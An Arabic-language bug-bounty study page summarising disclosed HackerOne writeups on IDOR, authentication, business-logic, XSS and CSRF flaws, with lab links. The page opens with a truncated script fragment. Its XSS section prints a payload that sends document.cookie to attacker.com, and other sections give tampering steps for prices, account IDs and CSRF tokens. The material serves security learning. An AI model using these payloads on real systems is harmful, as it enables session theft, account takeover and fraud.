
// Smooth cursor
const cursor = document.getElementById('cursor');
document.addEventListener('mousemove', e => {
  cursor.style.left = e.clientX - 4 + 'px';
  cursor.style.top = e.clientY - 4 + 'px';
});

// Active nav link on scroll
const sections = ['home','tools','mobile','about'];
const navLinks = document.querySelectorAll('.nav-link');

window.addEventListener('scroll', () => {
  const scrollY = window.scrollY + 100;
  sections.forEach((id, i) => {
    const el = document.getElementById(id);
    if(!el) return;
    if(scrollY >= el.offsetTop) {
      navLinks.forEach(l => l.classList.remove('active'));
      if(navLinks[i]) navLinks[i].classList.add('active');
    }
  });
});

// Animate stats on scroll
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if(entry.isIntersecting) {
      entry.target.style.animationPlayState = 'running';
    }
  });
}, { threshold: 0.1 });

document.querySelectorAll('.sbar-fill').forEach(el => {
  el.style.animationPlayState = 'paused';
  observer.observe(el.parentElement.parentElement);
});



function go(name){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
  document.querySelectorAll('.navbtn').forEach(b=>b.classList.remove('on'));
  document.getElementById('p-'+name).classList.add('o
</div>

<!-- ═══ BIBLE PAGE ═══ -->
<div id="page-bible" class="page">
<!-- HERO -->
<div class="hero">
  <div class="hero-tag">📚 VERIFIED WRITEUPS BIBLE</div>
  <h1>مرجع الـ <em>Writeups</em><br>الكامل والموثوق</h1>
  <p class="hero-sub">كل ثغرة + writeup حقيقي مُتحقق منه + الجزء العملي + Labs + مصادر موثوقة</p>
  <div class="hero-stats">
    <div class="hstat"><span class="hstat-n">8</span><span class="hstat-l">ثغرات</span></div>
    <div class="hstat"><span class="hstat-n">25+</span><span class="hstat-l">Writeup حقيقي</span></div>
    <div class="hstat"><span class="hstat-n">40+</span><span class="hstat-l">Lab مرجعي</span></div>
    <div class="hstat"><span class="hstat-n">📱</span><span class="hstat-l">موبايل-فيرست</span></div>
  </div>
</div>

<!-- INDEX -->
<div class="index-strip">
  <button class="idx-btn active" onclick="show('idor')">🔑 IDOR</button>
  <button class="idx-btn" onclick="show('auth')">🔐 Auth</button>
  <button class="idx-btn" onclick="show('logic')">💰 Business</button>
  <button class="idx-btn" onclick="show('xss')">⚡ XSS</button>
  <button class="idx-btn" onclick="show('csrf')">🔄 CSRF</button>
  <button class="idx-btn" onclick="show('ssrf')">🌐 SSRF</button>
  <button class="idx-btn" onclick="show('race')">⏱ Race</button>
  <button class="idx-btn" onclick="show('upload')">📁 Upload</button>
  <button class="idx-btn" onclick="show('api')">🔌 API</button>
  <button class="idx-btn" onclick="show('roadmap')">🗺 Roadmap</button>
</div>

<!-- ══════════════════════════════════════════
     IDOR
══════════════════════════════════════════ -->
<div id="p-idor" class="panel show">

  <div class="sec-head">
    <div class="sec-icon">🔑</div>
    <div>
      <div class="sec-title">IDOR / Broken Access Control</div>
      <div class="sec-desc">أتقنتها ✅ — هنا writeups حقيقية تعمّق فهمك</div>
    </div>
  </div>

  <!-- Writeup 1 -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(255,95,109,0.1);color:#ff8c94;">PAY<br>PAL</div>
      <div class="wc-meta">
        <div class="wc-title">IDOR to add secondary users in PayPal Business API</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $10,500</span>
          <span class="badge badge-critical">CRITICAL</span>
          <span class="badge badge-h1">HackerOne</span>
          <span>770 upvotes</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">ملخص الثغرة</div>
        <div class="wb-text">
          الـ endpoint <strong>/businessmanage/users/api/v1/users</strong> في PayPal كان يسمح بإضافة مستخدمين ثانويين لأي حساب تجاري عن طريق تغيير الـ business_account_id في الـ request. المشكلة: الـ server لم يتحقق إذا كان المستخدم الحالي يملك الحساب التجاري المستهدف.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">خطوات الاستغلال</div>
        <ol class="step-list">
          <li>سجّل دخول لحساب PayPal Business وأضف مستخدم ثانوي لحسابك</li>
          <li>سجّل الـ request في Tamper Dev: <code style="font-family:Rajdhani;font-size:11px;color:#f0c040">POST /businessmanage/users/api/v1/users</code></li>
          <li>غيّر قيمة <code style="font-family:Rajdhani;color:#43e97b">business_account_id</code> لـ ID حساب تجاري آخر</li>
          <li>الحساب المستهدف يُضاف إليه مستخدمك كـ secondary user بصلاحيات كاملة</li>
        </ol>
        <div class="code">
<span class="c"># Original Request</span>
<span class="k">POST</span> /businessmanage/users/api/v1/users
<span class="v">{"business_account_id": "YOUR_ACCT_ID", "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bad4dfcdcfc9dfc8fac294d9d5d7">[email&#160;protected]</a>"}
</span>
<span class="c"># IDOR — changed to victim's account</span>
<span class="d">{"business_account_id": "VICTIM_ACCT_ID", "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8feefbfbeeece4eafdcff7a1ece0e2">[email&#160;protected]</a>"}</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-green">الدرس المستفاد</div>
        <div class="wb-text">
          الـ IDOR مش بس في GET requests. أي action يستخدم ID — إضافة، حذف، تعديل — يجب اختباره. جرّب نفس المنطق في كل <strong>business/organization endpoints</strong> تراها.
        </div>
        <div class="callout callout-y">
          💡 من الموبايل: في Tamper Dev، سجّل الـ request، غيّر business_account_id بـ ID من حساب اختبار ثانٍ، أرسل وشوف النتيجة.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">الرابط الأصلي</div>
        <div class="link-list">
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPIDOR.md" target="_blank" class="link-item">
            <span class="link-icon">📋</span> قائمة أفضل IDOR Reports — HackerOne (GitHub)
            <span class="link-note">VERIFIED</span>
          </a>
        </div>
      </div>
    </div>
  </div>

  <!-- Writeup 2 -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(0,180,216,0.1);color:#7dd3fc;">UBER</div>
      <div class="wc-meta">
        <div class="wc-title">IDOR — Accessing another user's profile via phone number</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $10,000</span>
          <span class="badge badge-critical">CRITICAL</span>
          <span class="badge badge-h1">HackerOne #143717</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">ملخص الثغرة</div>
        <div class="wb-text">
          الباحث <strong>Mongobug</strong> اكتشف إن الـ IDOR في Uber لم يكن يستخدم ID رقمي — بل كان رقم الهاتف. عن طريق تمرير رقم هاتف أي مستخدم في الـ API request، استطاع الوصول لبيانات حسابه الكاملة.
        </div>
        <div class="callout callout-r">
          ⚡ الدرس الأهم: الـ IDOR مش بس id=1,2,3 — يمكن أن يكون email، phone، username، أو أي identifier فريد!
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">تطبيق عملي</div>
        <div class="wb-text">عند Bug Hunting، ابحث عن هذه الـ identifiers في الـ requests:</div>
        <div class="code">
<span class="c"># IDs ممكن تكون IDOR</span>
<span class="k">?id=</span>          <span class="c">← الأوضح</span>
<span class="k">?phone=</span>       <span class="c">← مثل Uber</span>
<span class="k">?email=</span>       <span class="c">← شائع جداً</span>
<span class="k">?username=</span>    <span class="c">← profiles</span>
<span class="k">?account_id=</span>  <span class="c">← business</span>
<span class="k">?order_id=</span>    <span class="c">← ecommerce ← ركّز هنا</span>
<span class="k">?ticket_id=</span>   <span class="c">← support systems</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">المصدر</div>
        <div class="link-list">
          <a href="https://hackerone.com/reports/143717" target="_blank" class="link-item">
            <span class="link-icon">🔗</span> HackerOne Report #143717 — Uber IDOR
            <span class="link-note">DISCLOSED</span>
          </a>
        </div>
      </div>
    </div>
  </div>

  <!-- Writeup 3 — TikTok -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(67,233,123,0.1);color:#86efac;">TIK<br>TOK</div>
      <div class="wc-meta">
        <div class="wc-title">TikTok Memory Privacy IDOR — عرض "Memories" مستخدمين آخرين</div>
        <div class="wc-source">
          <span class="badge badge-high">HIGH</span>
          <span class="badge badge-h1">HackerOne 2023</span>
          <span class="badge badge-source">VERIFIED 2025</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">التفاصيل</div>
        <div class="wb-text">
          باحث في 2023 اكتشف إن تغيير الـ parameter <strong>aweme_id</strong> في API request خاص بميزة "Memories" في TikTok يسمح بعرض ذكريات أي مستخدم آخر — حتى لو كانت private.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">الدرس</div>
        <div class="wb-text">
          <strong>Features جديدة = ثغرات جديدة.</strong> كلما أطلقت شركة feature جديد، يكون الكود أقل اختباراً. ركّز على الـ features المُضافة حديثاً في أي برنامج Bug Bounty.
        </div>
        <div class="callout callout-g">
          ✅ من الموبايل: عند تجربة feature جديد، افتح Tamper Dev فوراً وراقب الـ requests. كل parameter جديد هو فرصة.
        </div>
      </div>
    </div>
  </div>

  <!-- Labs IDOR -->
  <div class="wb-section" style="background:var(--card); border:1px solid var(--line); border-radius:8px; padding:14px; margin-bottom:14px;">
    <div class="wb-label lbl-green" style="margin-bottom:10px;">🧪 Labs PortSwigger — IDOR</div>
    <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter" target="_blank" class="lab-row">
      <span>🧪</span> IDOR via request parameter — user data <span class="lab-diff diff-a">Apprentice</span>
    </a>
    <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids" target="_blank" class="lab-row">
      <span>🧪</span> IDOR with unpredictable GUIDs <span class="lab-diff diff-p">Practitioner</span>
    </a>
    <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect" target="_blank" class="lab-row">
      <span>🧪</span> IDOR with data leakage in redirect <span class="lab-diff diff-p">Practitioner</span>
    </a>
    <a href="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality" target="_blank" class="lab-row">
      <span>🧪</span> Admin panel exposure — no auth <span class="lab-diff diff-a">Apprentice</span>
    </a>
    <a href="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented" target="_blank" class="lab-row">
      <span>🧪</span> Method-based access control bypass <span class="lab-diff diff-p">Practitioner</span>
    </a>
    <a href="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step" target="_blank" class="lab-row">
      <span>🧪</span> Multi-step bypass — missing check on step 2 <span class="lab-diff diff-p">Practitioner</span>
    </a>
  </div>

  <!-- Sources -->
  <div class="link-list" style="margin-bottom:16px;">
    <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP Broken Access Control (A01:2021)</a>
    <a href="https://portswigger.net/web-security/access-control" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger Access Control Academy</a>
    <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPIDOR.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top 200+ IDOR Reports — GitHub (موثوق 100%)</a>
    <a href="https://aimasterprompt.medium.com/top-235-idor-bug-bounty-reports-e00c8061fe28" target="_blank" class="link-item"><span class="link-icon">📝</span> Top 235 IDOR Writeups — Medium 2025</a>
    <a href="https://www.intigriti.com/researchers/hackademy/idor" target="_blank" class="link-item"><span class="link-icon">🎯</span> Intigriti IDOR Hackademy</a>
    <a href="https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/" target="_blank" class="link-item"><span class="link-icon">🐛</span> Bugcrowd IDOR Methodology</a>
  </div>
</div>

<!-- ══════════════════════════════════════════
     AUTH
══════════════════════════════════════════ -->
<div id="p-auth" class="panel">
  <div class="sec-head">
    <div class="sec-icon">🔐</div>
    <div>
      <div class="sec-title">Authentication Vulnerabilities</div>
      <div class="sec-desc">Username Enumeration ✅ — Brute Force ⚡ — 2FA Bypass ❌</div>
    </div>
  </div>

  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(240,192,64,0.1);color:#f0c040;">INSTA<br>GRAM</div>
      <div class="wc-meta">
        <div class="wc-title">Username Enumeration — Bypass 2FA via different endpoint</div>
        <div class="wc-source">
          <span class="badge badge-high">HIGH</span>
          <span class="badge badge-h1">HackerOne — Facebook BB</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">الثغرة</div>
        <div class="wb-text">
          إمكانية حصر حسابات Instagram التي تمتلك 2FA عن طريق الفرق في الـ response — الحسابات التي تمتلك 2FA تُرجع response مختلف عن تلك التي لا تمتلكه.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">كيف تكتشف Username Enumeration من الموبايل</div>
        <ol class="step-list">
          <li>في صفحة Login، أدخل username صحيح وكلمة مرور خاطئة — سجّل الـ response</li>
          <li>أدخل username خاطئ وكلمة مرور خاطئة — سجّل الـ response</li>
          <li>قارن في Tamper Dev: هل الـ response مختلف؟ (رسالة مختلفة / response time مختلف / status code مختلف)</li>
          <li>إذا نعم → Username Enumeration مؤكدة</li>
          <li>جرّب أيضاً صفحة Forgot Password — غالباً أكثر تسريباً</li>
        </ol>
        <div class="code">
<span class="c"># Response لـ valid username</span>
<span class="v">{"error": "Invalid password"}</span>
<span class="c"># Response لـ invalid username</span>
<span class="d">{"error": "User not found"}</span>
<span class="c">← هذا الفرق = Enumeration!</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">المصادر</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" target="_blank" class="link-item"><span class="link-icon">🧪</span> Lab: Username Enumeration via different responses <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing" target="_blank" class="link-item"><span class="link-icon">🧪</span> Lab: Enumeration via response timing <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack" target="_blank" class="link-item"><span class="link-icon">🧪</span> Lab: 2FA Bypass via brute force <span class="link-note">Expert</span></a>
          <a href="https://portswigger.net/web-security/authentication" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger Authentication Academy</a>
          <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP Authentication Testing Guide</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     BUSINESS LOGIC
══════════════════════════════════════════ -->
<div id="p-logic" class="panel">
  <div class="sec-head">
    <div class="sec-icon">💰</div>
    <div>
      <div class="sec-title">Business Logic Bugs</div>
      <div class="sec-desc">Price Manipulation ✅ — Infinite Money ⚡ — Coupon Abuse ⚡</div>
    </div>
  </div>

  <!-- Stripe writeup -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(67,233,123,0.1);color:#86efac;">STR<br>IPE</div>
      <div class="wc-meta">
        <div class="wc-title">Race Condition + Business Logic = Unlimited Discount Redemption</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $5,000</span>
          <span class="badge badge-critical">CRITICAL</span>
          <span class="badge badge-h1">HackerOne</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">القصة الكاملة</div>
        <div class="wb-text">
          الباحث <strong>Ian</strong> اكتشف في Stripe إن كوبون الخصم يمكن تطبيقه أكثر من مرة بسبب Race Condition. Stripe حاولت إصلاحه أولاً بإضافة check إضافي، لكن Ian أثبت وجود bypass. بعد الإصلاح الثاني تأكد الحل الكامل.
        </div>
        <div class="callout callout-r">
          ⚡ الثغرة البسيطة (Business Logic) + Race Condition = $5,000. الجمع بين ثغرتين يضاعف التأثير والمكافأة.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">منطق الثغرة</div>
        <div class="code">
<span class="c"># التطبيق يتحقق: "هل الكوبون مُستخدم؟"</span>
<span class="v">if coupon.used == false:</span>
<span class="v">    apply_discount()</span>
<span class="v">    coupon.used = true  <span class="c">← يُكتب بعد Apply</span></span>
<span class="c"># Race: إرسال requestين قبل كتابة used=true</span>
<span class="d">Thread 1: check → false → apply_discount()</span>
<span class="d">Thread 2: check → false → apply_discount() ← مرتين!</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">المصدر الرسمي</div>
        <div class="link-list">
          <a href="https://www.hackerone.com/blog/how-business-logic-vulnerability-led-unlimited-discount-redemption" target="_blank" class="link-item">
            <span class="link-icon">📝</span> HackerOne Official Blog — Stripe Writeup
            <span class="link-note">VERIFIED</span>
          </a>
          <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money" target="_blank" class="link-item">
            <span class="link-icon">🧪</span> Lab: Infinite Money Logic Flaw <span class="link-note">Practitioner</span>
          </a>
          <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level" target="_blank" class="link-item">
            <span class="link-icon">🧪</span> Lab: Low-level Logic Flaw (integer overflow) <span class="link-note">Practitioner</span>
          </a>
          <a href="https://portswigger.net/web-security/logic-flaws" target="_blank" class="link-item">
            <span class="link-icon">🟢</span> PortSwigger Business Logic Academy
          </a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPBUSINESSLOGIC.md" target="_blank" class="link-item">
            <span class="link-icon">📋</span> Top Business Logic Reports — HackerOne (GitHub)
          </a>
        </div>
      </div>
    </div>
  </div>

  <!-- Adobe Price Manipulation -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(255,95,109,0.1);color:#ff8c94;">ADO<br>BE</div>
      <div class="wc-meta">
        <div class="wc-title">Parameter Tampering — Product Price Manipulation</div>
        <div class="wc-source">
          <span class="badge badge-high">HIGH</span>
          <span class="badge badge-h1">HackerOne — 33 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">التفاصيل</div>
        <div class="wb-text">
          في Adobe، تغيير قيمة السعر في الـ POST request لصفحة Checkout أدى لقبول الطلب بالسعر المُعدَّل. الـ server لم يتحقق من السعر على الـ backend.
        </div>
        <div class="code">
<span class="c"># Original Request</span>
<span class="k">POST</span> /checkout
<span class="v">{"product_id": "123", "price": 49.99}</span>
<span class="c"># Manipulated</span>
<span class="d">{"product_id": "123", "price": 0.01}</span>
<span class="c">← الـ server قبل الطلب بسعر 1 سنت!</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">كيف تطبّقه من الموبايل</div>
        <ol class="step-list">
          <li>في Tamper Dev، فعّل Intercept</li>
          <li>أضف منتج للسلة واضغط Checkout</li>
          <li>عدّل قيمة price أو amount في الـ request</li>
          <li>جرّب: 0.01 أو 1 أو قيمة سالبة -1</li>
          <li>هل قبل الـ server؟ → Price Manipulation!</li>
        </ol>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     XSS
══════════════════════════════════════════ -->
<div id="p-xss" class="panel">
  <div class="sec-head">
    <div class="sec-icon">⚡</div>
    <div>
      <div class="sec-title">XSS — Cross-Site Scripting</div>
      <div class="sec-desc">Reflected ❌ — Stored ❌ — DOM ❌ — ابدأ هنا بعد IDOR</div>
    </div>
  </div>

  <!-- Uber Stored XSS -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(0,180,216,0.1);color:#7dd3fc;">UBER</div>
      <div class="wc-meta">
        <div class="wc-title">Stored XSS in developer.uber.com — Developer Portal</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $7,500</span>
          <span class="badge badge-critical">CRITICAL</span>
          <span class="badge badge-h1">HackerOne — 222 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">ملخص</div>
        <div class="wb-text">
          في Developer Portal لـ Uber، حقل اسم التطبيق لم يكن يُنقَّى بشكل صحيح. المهاجم أنشأ تطبيق باسم يحتوي XSS payload — وعند مراجعة الـ admin للتطبيق، نُفِّذ الكود في متصفحه.
        </div>
        <div class="callout callout-r">
          ⚡ Stored XSS الموجّه للـ Admin = Account Takeover كامل. هذا ما يجعله Critical وليس High.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">الـ Payload المُستخدم</div>
        <div class="code">
<span class="c"># في حقل "Application Name"</span>
<span class="d">&lt;img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"&gt;</span>
<span class="c"># عند فتح Admin للصفحة → cookies تُرسل للمهاجم</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-green">كيف تبحث عن Stored XSS من الموبايل</div>
        <ol class="step-list">
          <li>ابحث عن أي input يُعرض في الصفحة لاحقاً: Profile name, Bio, Comments, Reviews</li>
          <li>اكتب: <code style="font-family:Rajdhani;color:#f0c040">"'&lt;&gt;</code> في أي حقل واحفظ</li>
          <li>افتح الصفحة في View Source وابحث عن قيمتك — هل تغيّرت؟</li>
          <li>إذا لم تتغيّر → جرّب: <code style="font-family:Rajdhani;color:#43e97b">&lt;img src=x onerror=alert(1)&gt;</code></li>
          <li>إذا ظهر popup → Stored XSS مؤكد</li>
          <li>في الـ Bug Report: استخدم <code style="font-family:Rajdhani;color:#43e97b">alert(document.domain)</code> كـ PoC</li>
        </ol>
        <div class="tool-row">
          <span class="tool-pill">Kiwi Browser</span>
          <span class="tool-pill">Tamper Dev</span>
          <span class="tool-pill">webhook.site</span>
          <span class="tool-pill">DevTools Console</span>
        </div>
      </div>
    </div>
  </div>

  <!-- Reddit Reflected XSS -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(255,95,109,0.1);color:#ff8c94;">RED<br>DIT</div>
      <div class="wc-meta">
        <div class="wc-title">Reflected XSS in sh.reddit.com</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $5,000</span>
          <span class="badge badge-h1">HackerOne — 160 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">الدرس</div>
        <div class="wb-text">
          Reflected XSS في Reddit كان في subdomain خاص بـ Shopping. الـ parameter في الـ URL لم يُعالَج بشكل صحيح قبل العرض في الصفحة. الـ payload كان عبر URL مرسل للضحية.
        </div>
        <div class="callout callout-y">
          💡 الـ Subdomains غالباً أقل اختباراً من الـ Main domain. ابحث عن: shop., m., api., dev., stage., beta. في أي هدف.
        </div>
      </div>
    </div>
  </div>

  <!-- DOM XSS HackerOne -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(67,233,123,0.1);color:#86efac;">H1</div>
      <div class="wc-meta">
        <div class="wc-title">DOM Based XSS in www.hackerone.com via PostMessage</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $500</span>
          <span class="badge badge-h1">HackerOne — 203 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">ما هو DOM XSS عبر postMessage</div>
        <div class="wb-text">
          الصفحة تستمع لـ <strong>window.postMessage</strong> وتضع المحتوى في الـ DOM مباشرة بدون تنقية. المهاجم يفتح الصفحة في iframe ويرسل message خبيث.
        </div>
        <div class="code">
<span class="c"># في DevTools Console، ابحث عن:</span>
<span class="k">window.addEventListener('message', </span><span class="v">...</span><span class="k">)</span>
<span class="c"># هل تضع الـ data مباشرة في innerHTML؟</span>
<span class="d">element.innerHTML = event.data  ← XSS!</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">Labs + مصادر XSS</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank" class="link-item"><span class="link-icon">🧪</span> Reflected XSS — No encoding <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank" class="link-item"><span class="link-icon">🧪</span> Stored XSS — No encoding <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank" class="link-item"><span class="link-icon">🧪</span> DOM XSS via document.write <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf" target="_blank" class="link-item"><span class="link-icon">🧪</span> Exploiting XSS to perform CSRF <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="link-item"><span class="link-icon">📋</span> XSS Cheat Sheet — PortSwigger (مرجع أساسي)</a>
          <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP XSS Prevention Cheat Sheet</a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top XSS Reports — HackerOne (GitHub)</a>
          <a href="https://corneacristian.medium.com/top-25-xss-bug-bounty-reports-b3c90e2288c8" target="_blank" class="link-item"><span class="link-icon">📝</span> Top 25 XSS Bug Bounty Reports — Medium</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     CSRF
══════════════════════════════════════════ -->
<div id="p-csrf" class="panel">
  <div class="sec-head">
    <div class="sec-icon">🔄</div>
    <div>
      <div class="sec-title">CSRF — Cross-Site Request Forgery</div>
      <div class="sec-desc">Change Email ❌ — CSRF Token Bypass ❌ — SameSite Bypass ❌</div>
    </div>
  </div>

  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(240,192,64,0.1);color:#f0c040;">REAL<br>CSRF</div>
      <div class="wc-meta">
        <div class="wc-title">CSRF Bypass — Blank token + Clickjacking → Email Change</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 4-digit bounty</span>
          <span class="badge badge-high">HIGH</span>
          <span class="badge badge-source">BugBountyHunter — ZSeano</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">القصة الحقيقية</div>
        <div class="wb-text">
          الباحث <strong>ZSeano</strong> وجد إن إرسال CSRF token فارغ في طلب تغيير الـ email لم يمنع الـ request من الـ "reflection" — التغيير انعكس في الصفحة لكن لم يُحفَظ. باستخدام iframe + Clickjacking، أجبر المستخدم على الضغط على "Confirm" → تغيّر الـ email فعلاً.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">كيف تختبر CSRF من الموبايل</div>
        <ol class="step-list">
          <li>ابحث عن POST request يغيّر شيء حساس: email, password, phone</li>
          <li>في Tamper Dev، احذف الـ csrf_token من الـ request كلياً</li>
          <li>أرسل — هل رفض الـ server أو قبل؟</li>
          <li>إذا رفض، جرّب إرسال token فارغ: csrf_token=</li>
          <li>جرّب token عشوائي: csrf_token=aaaa</li>
          <li>جرّب تغيير method من POST لـ GET</li>
          <li>إذا قبل أي منها → CSRF!</li>
        </ol>
        <div class="code">
<span class="c"># Test 1: No token</span>
<span class="k">POST</span> /change-email
<span class="v"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a7c2cac6cecb9ac6d3d3c6c4ccc2d5e7c2d1cecb89c4c8ca">[email&#160;protected]</a></span>

<span class="c"># Test 2: Empty token</span>
<span class="k">POST</span> /change-email
<span class="v"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7f1a121e1613421e0b0b1e1c141a0d3f1a091613511c1012">[email&#160;protected]</a>&csrf_token=</span>

<span class="c"># Test 3: Random token</span>
<span class="k">POST</span> /change-email
<span class="d"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b7d2dad6dedb8ad6c3c3d6d4dcd2c5f7d2c1dedb99d4d8da">[email&#160;protected]</a>&csrf_token=hacked123</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">Labs + مصادر CSRF</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank" class="link-item"><span class="link-icon">🧪</span> CSRF — No defenses <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session" target="_blank" class="link-item"><span class="link-icon">🧪</span> CSRF token not tied to session <span class="link-note">Practitioner</span></a>
